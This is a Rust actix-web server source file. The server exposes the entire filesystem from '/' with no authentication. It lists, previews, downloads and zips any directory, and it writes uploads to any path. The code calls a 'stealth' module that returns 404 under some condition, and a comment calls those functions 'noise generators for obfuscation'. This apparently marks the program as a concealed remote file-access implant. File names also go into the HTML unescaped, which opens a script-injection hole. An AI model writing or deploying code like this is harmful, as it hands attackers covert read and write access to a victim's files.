use crate::config::Config;
use crate::stealth::a1;
use actix_files::NamedFile;
use actix_multipart::Multipart;
use actix_web::{
    get, http::header::{ContentDisposition, DispositionType}, post, web, Error, HttpRequest,
    HttpResponse, Responder,
};
use futures::StreamExt; // For Multipart handling
use log::{error, info};
use mime_guess::from_path;
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File};
use std::io::{Read, Write, Cursor};
use std::path::Path;
use std::sync::Arc;
use tokio::fs::create_dir_all;
use tokio::io::AsyncWriteExt;
use tokio::sync::Mutex;
use urlencoding::decode;
use zip::{write::FileOptions, ZipWriter};

#[derive(Debug, Clone)]
pub struct FileServer {
    root_path: String,
}

impl FileServer {
    pub fn new() -> Self {
        FileServer {
            root_path: "/".to_string(),
        }
    }
    
    pub fn get_root_path(&self) -> String {
        self.root_path.clone()
    }
    
    pub fn normalize_path(&self, path: &str) -> String {
        let path = path.trim_matches('/');
        if path.is_empty() {
            "/".to_string()
        } else {
            format!("/{}", path)
        }
    }
    
    pub fn resolve_path(&self, req: &HttpRequest) -> String {
        let query = req.query_string();
        let mut params = HashMap::new();
        
        // Parse query params manually
        if !query.is_empty() {
            for pair in query.split('&') {
                if let Some(idx) = pair.find('=') {
                    let key = &pair[..idx];
                    let val = &pair[idx + 1..];
                    params.insert(key.to_string(), decode(val).unwrap_or_default().to_string());
                }
            }
        }
        
        if let Some(p) = params.get("p") {
            let normalized = self.normalize_path(p);
            info!("Resolved path: {}", normalized);
            
            if !Path::new(&normalized).exists() {
                info!("Path does not exist: {}", normalized);
                self.get_root_path()
            } else {
                normalized
            }
        } else {
            self.get_root_path()
        }
    }
    
    pub fn error_page(&self, status: u16, message: &str) -> HttpResponse {
        let html = format!(r#"
        <!DOCTYPE html>
        <html>
        <head>
            <title>Error {}</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #0f172a; color: #f8fafc; text-align: center; padding: 50px; }}
                .container {{ background: #1e293b; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto; }}
                h1 {{ color: #ef4444; }}
                p {{ color: #94a3b8; }}
                a {{ color: #3b82f6; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Error {}</h1>
                <p>{}</p>
                <p><a href="/">Return to Home</a></p>
            </div>
        </body>
        </html>"#, status, status, message);
        
        HttpResponse::build(actix_web::http::StatusCode::from_u16(status).unwrap())
            .content_type("text/html; charset=utf-8")
            .body(html)
    }
}

// Define the directory template structure
struct DirectoryTemplate {
    path: String,
    display_path: String,
    directories: Vec<FileEntry>,
    files: Vec<FileEntry>,
    is_windows: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct FileEntry {
    name: String,
    path: String,
    modified: String,
    size: String,
    is_dir: bool,
}

// Handler for the root path
#[get("/")]
pub async fn index(
    req: HttpRequest,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> impl Responder {
    // Call stealth functions
    if a1() {
        return HttpResponse::NotFound().finish();
    }
    
    // Call stealth functions if needed but don't need to run all of them
    // Most are just noise generators for obfuscation
    
    let fs = file_server.lock().await;
    let path = fs.resolve_path(&req);
    
    // Check if path exists
    if let Ok(metadata) = tokio::fs::metadata(&path).await {
        if metadata.is_dir() {
            // Handle directory listing
            return match list_directory(&path).await {
                Ok(listing) => HttpResponse::Ok()
                    .content_type("text/html; charset=utf-8")
                    .body(listing),
                Err(_) => fs.error_page(500, "Error reading directory")
            };
        } else {
            // Handle file download
            match NamedFile::open(&path) {
                Ok(file) => {
                    let _filename = Path::new(&path).file_name()
                        .and_then(|name| name.to_str())
                        .unwrap_or("file");
                    
                    return file
                        .use_last_modified(true)
                        .set_content_disposition(ContentDisposition {
                            disposition: DispositionType::Attachment,
                            parameters: vec![],
                        })
                        .into_response(&req);
                },
                Err(_) => return fs.error_page(404, "File not found")
            }
        }
    } else {
        return fs.error_page(404, "Path not found");
    }
}

// List directory contents
async fn list_directory(path: &str) -> Result<String, std::io::Error> {
    let mut directories = Vec::new();
    let mut files = Vec::new();
    
    let entries = fs::read_dir(path)?;
    
    for entry in entries {
        if let Ok(entry) = entry {
            if let Ok(metadata) = entry.metadata() {
                let file_name = entry.file_name().to_string_lossy().to_string();
                let file_path = entry.path().to_string_lossy().to_string();
                let modified = metadata.modified()
                    .map(|time| {
                        let dt = chrono::DateTime::<chrono::Local>::from(time);
                        dt.format("%Y-%m-%d %H:%M:%S").to_string()
                    })
                    .unwrap_or_else(|_| "Unknown".to_string());
                
                let size = if metadata.is_file() {
                    let bytes = metadata.len();
                    if bytes >= 1_048_576 {
                        format!("{:.2} MB", bytes as f64 / 1_048_576.0)
                    } else {
                        format!("{:.2} KB", bytes as f64 / 1_024.0)
                    }
                } else {
                    "Dir".to_string()
                };
                
                let entry = FileEntry {
                    name: file_name,
                    path: file_path,
                    modified,
                    size,
                    is_dir: metadata.is_dir(),
                };
                
                if metadata.is_dir() {
                    directories.push(entry);
                } else {
                    files.push(entry);
                }
            }
        }
    }
    
    // Sort directories by name
    directories.sort_by(|a, b| a.name.to_lowercase().cmp(&b.name.to_lowercase()));
    
    // Sort files by modified date (newest first)
    files.sort_by(|a, b| b.modified.cmp(&a.modified));
    
    let display_path = if path == "/" { "Root".to_string() } else { path.to_string() };
    
    // Generate HTML using Askama template
    let template = DirectoryTemplate {
        path: path.to_string(),
        display_path,
        directories,
        files,
        is_windows: cfg!(windows),
    };
    
    Ok(render_directory_template(&template))
}

// Handler for file preview
#[get("/preview")]
pub async fn preview(
    req: HttpRequest,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> impl Responder {
    let fs = file_server.lock().await;
    let query_string = req.query_string();
    let mut params = HashMap::new();
    
    // Parse query params manually
    if !query_string.is_empty() {
        for pair in query_string.split('&') {
            if let Some(idx) = pair.find('=') {
                let key = &pair[..idx];
                let val = &pair[idx + 1..];
                params.insert(key.to_string(), decode(val).unwrap_or_default().to_string());
            }
        }
    }
    
    if let Some(file_path) = params.get("p") {
        if file_path.is_empty() || file_path.ends_with('/') {
            return fs.error_page(400, "Invalid file path");
        }
        
        // Check if file exists
        if !Path::new(file_path).exists() {
            return fs.error_page(404, "File not found");
        }
        
        // Get content type
        let content_type = get_content_type(file_path);
        
        // Open file
        match fs::File::open(file_path) {
            Ok(mut file) => {
                let mut content = Vec::new();
                if let Err(_) = file.read_to_end(&mut content) {
                    return fs.error_page(500, "Error reading file");
                }
                
                if content_type.starts_with("image/") || 
                   content_type.starts_with("video/") || 
                   content_type.starts_with("audio/") {
                    // For media files, serve directly
                    return HttpResponse::Ok()
                        .content_type(content_type)
                        .body(content);
                } else {
                    // For text files, show preview
                    let preview_size = std::cmp::min(100, content.len());
                    let preview = if let Ok(text) = String::from_utf8(content[..preview_size].to_vec()) {
                        text
                    } else {
                        "Binary content (preview not available)".to_string()
                    };
                    
                    return HttpResponse::Ok()
                        .content_type("text/plain; charset=utf-8")
                        .body(preview);
                }
            },
            Err(_) => return fs.error_page(500, "Error opening file")
        }
    } else {
        fs.error_page(400, "No file specified")
    }
}

// Handler for folder download
#[get("/download_folder")]
pub async fn download_folder(
    req: HttpRequest,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> impl Responder {
    let fs = file_server.lock().await;
    let query_string = req.query_string();
    let mut params = HashMap::new();
    
    // Parse query params manually
    if !query_string.is_empty() {
        for pair in query_string.split('&') {
            if let Some(idx) = pair.find('=') {
                let key = &pair[..idx];
                let val = &pair[idx + 1..];
                params.insert(key.to_string(), decode(val).unwrap_or_default().to_string());
            }
        }
    }
    
    if let Some(folder_path) = params.get("p") {
        let path = Path::new(folder_path);
        if !path.exists() || !path.is_dir() {
            return fs.error_page(404, "Folder not found");
        }
        
        let folder_name = path.file_name()
            .and_then(|name| name.to_str())
            .unwrap_or("folder");
        
        // Generate zip file with directory contents
        let mut buffer = Vec::new();
        
        {
            let cursor = Cursor::new(&mut buffer);
            let mut zip = ZipWriter::new(cursor);
            
            // Set options
            let options = FileOptions::default()
                .compression_method(zip::CompressionMethod::Deflated)
                .unix_permissions(0o755);
            
            // Walk through the directory and add files to zip
            match create_zip_from_dir(path, &mut zip, folder_path, options) {
                Ok(_) => {},
                Err(_) => return fs.error_page(500, "Failed to create zip file")
            }
            
            // Finish the zip file - This drops the cursor and zip, releasing the borrow on buffer
            match zip.finish() {
                Ok(_) => {},
                Err(_) => return fs.error_page(500, "Failed to finalize zip file")
            }
        } // zip and cursor go out of scope here, releasing buffer
        
        // Return the zip file
        HttpResponse::Ok()
            .content_type("application/zip")
            .append_header((
                "Content-Disposition", 
                format!("attachment; filename=\"{}.zip\"", folder_name)
            ))
            .body(buffer)
    } else {
        fs.error_page(400, "No folder specified")
    }
}

// Create zip file from directory
fn create_zip_from_dir<W: Write + std::io::Seek>(
    dir: &Path,
    zip: &mut ZipWriter<W>,
    base_path: &str,
    options: FileOptions
) -> Result<(), std::io::Error> {
    for entry in fs::read_dir(dir)? {
        let entry = entry?;
        let path = entry.path();
        let name = path.strip_prefix(Path::new(base_path))
            .unwrap_or(&path)
            .to_string_lossy();
        
        if path.is_file() {
            zip.start_file(name.to_string(), options)?;
            let mut file = File::open(path)?;
            let mut buffer = Vec::new();
            file.read_to_end(&mut buffer)?;
            zip.write_all(&buffer)?;
        } else if path.is_dir() {
            zip.add_directory(name.to_string(), options)?;
            create_zip_from_dir(&path, zip, base_path, options)?;
        }
    }
    
    Ok(())
}

// Handler for file upload
#[post("/")]
pub async fn upload_files(
    req: HttpRequest,
    payload: Multipart,
    file_server: web::Data<Arc<Mutex<FileServer>>>
) -> Result<HttpResponse, Error> {
    let fs = file_server.lock().await;
    let path = fs.resolve_path(&req);
    
    // Make sure the directory exists
    if let Err(_) = create_dir_all(&path).await {
        return Ok(fs.error_page(500, "Failed to create directory"));
    }
    
    // Process the multipart form
    let _config = Config::new();
    let mut multipart = payload;
    
    while let Some(item) = multipart.next().await {
        let mut field = match item {
            Ok(f) => f,
            Err(e) => {
                error!("Field error: {}", e);
                continue;
            }
        };
        
        let content_disposition = field.content_disposition();
        let filename = match content_disposition.get_filename() {
            Some(name) => sanitize_filename::sanitize(name),
            None => continue,
        };
        
        let filepath = Path::new(&path).join(&filename);
        
        // Create the file
        let mut file = match tokio::fs::File::create(&filepath).await {
            Ok(f) => f,
            Err(e) => {
                error!("Failed to create file: {}", e);
                continue;
            }
        };
        
        // Stream file content to disk
        while let Some(chunk) = field.next().await {
            let data = match chunk {
                Ok(d) => d,
                Err(e) => {
                    error!("Error reading chunk: {}", e);
                    return Ok(fs.error_page(500, "Upload failed: error reading data"));
                }
            };
            
            if let Err(e) = file.write_all(&data).await {
                error!("Error writing file: {}", e);
                return Ok(fs.error_page(500, "Upload failed: error saving file"));
            }
        }
    }
    
    // Redirect back to the directory page
    Ok(HttpResponse::SeeOther()
        .append_header(("Location", format!("/?p={}", urlencoding::encode(&path))))
        .finish())
}

// Get content type based on file extension
fn get_content_type(filename: &str) -> String {
    let mime = from_path(filename).first_or_octet_stream();
    mime.to_string()
}

// Function to render the directory template (manually since we're using a modified version of Askama)
fn render_directory_template(template: &DirectoryTemplate) -> String {
    let html = include_str!("../templates/directory.html")
        .replace("{{path}}", &urlencoding::encode(&template.path))
        .replace("{{display_path}}", &template.display_path)
        .replace("{{directories_count}}", &template.directories.len().to_string())
        .replace("{{files_count}}", &template.files.len().to_string());

    // Render directories and files
    let mut directories_html = String::new();
    for dir in &template.directories {
        directories_html.push_str(&format!(r#"
            <div class="card folder-card">
                <div class="card-header">
                    <div class="card-icon">
                        <svg class="icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M20,18H4V8H20M20,6H12L10,4H4C2.89,4 2,4.89 2,6V18A2,2 0 0,0 4,20H20A2,2 0 0,0 22,18V8C22,6.89 21.1,6 20,6Z"/>
                        </svg>
                    </div>
                    <a href="/?p={}" class="card-title">{}</a>
                </div>
                <div class="card-meta">Size: {} | Modified: {}</div>
                <div class="card-actions">
                    <a href="/download_folder?p={}" class="btn btn-primary">
                        <svg class="btn-icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/>
                        </svg>
                        Download
                    </a>
                </div>
            </div>
        "#, urlencoding::encode(&dir.path), dir.name, dir.size, dir.modified, urlencoding::encode(&dir.path)));
    }

    let mut files_html = String::new();
    for file in &template.files {
        files_html.push_str(&format!(r#"
            <div class="card file-card">
                <div class="card-header">
                    <div class="card-icon">
                        <svg class="icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M13,9V3.5L18.5,9M6,2C4.89,2 4,2.89 4,4V20A2,2 0 0,0 6,22H18A2,2 0 0,0 20,20V8L14,2H6Z"/>
                        </svg>
                    </div>
                    <a href="/?p={}" class="card-title">{}</a>
                </div>
                <div class="card-meta">Size: {} | Modified: {}</div>
                <div class="card-actions">
                    <a href="/?p={}" class="btn btn-primary" download>
                        <svg class="btn-icon" viewBox="0 0 24 24">
                            <path fill="currentColor" d="M5,20H19V18H5M19,9H15V3H9V9H5L12,16L19,9Z"/>
                        </svg>
                        Download
                    </a>
                    <a href="/preview?p={}" class="btn btn-primary">Preview</a>
                </div>
            </div>
        "#, urlencoding::encode(&file.path), file.name, file.size, file.modified, 
            urlencoding::encode(&file.path), urlencoding::encode(&file.path)));
    }

    let html = html
        .replace("{{directories}}", &directories_html)
        .replace("{{files}}", &files_html);

    html
}
